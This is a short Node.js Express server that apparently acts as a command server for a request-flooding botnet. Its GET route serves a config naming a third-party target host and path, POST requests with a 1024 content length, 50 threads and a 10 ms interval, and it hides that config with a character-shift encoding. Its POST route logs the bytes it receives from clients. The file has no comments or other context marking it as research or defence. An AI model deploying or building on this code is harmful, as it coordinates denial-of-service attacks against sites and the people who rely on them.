const express = require('express');
const app = express();
const port = 3000;

app.get('/', (_, res) => {
  const newLine = '\r\n';
  const host = 'beatmasta.studio';
  const port = 443;
  const path = '/test.php';
  const method = 'POST';
  const contentLength = 1024;
  const threadCount = 50;
  const callIntervalInMs = 10;
  const configFetchIntervalInMs = 1000000;
  const enabled = true;
  const ssl = true;

  let body = `
headers=${method} ${path} HTTP/1.1${newLine}Host: ${host}${newLine}Accept: */*${newLine}Content-length: ${contentLength};
host=${host};
port=${port};
content_length=${contentLength};
thread_count=${threadCount};
call_interval_in_ms=${callIntervalInMs};
config_fetch_interval_in_ms=${configFetchIntervalInMs};
enabled=${enabled};
ssl=${ssl}${newLine}
  `;

  body = body
    .split('')
    .map((__, i) => String.fromCharCode(body.charCodeAt(i) + 13))
    .join('');

  console.log('Sending config...');
  res.set('Content-Type', 'text/plain');
  res.send(body);
});

app.post('/', (req, res) => {
  console.log('Receiving data with len: ', req.socket.bytesRead);
  res.send('Hello World!');
});

app.use(function (err, _, res, __) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
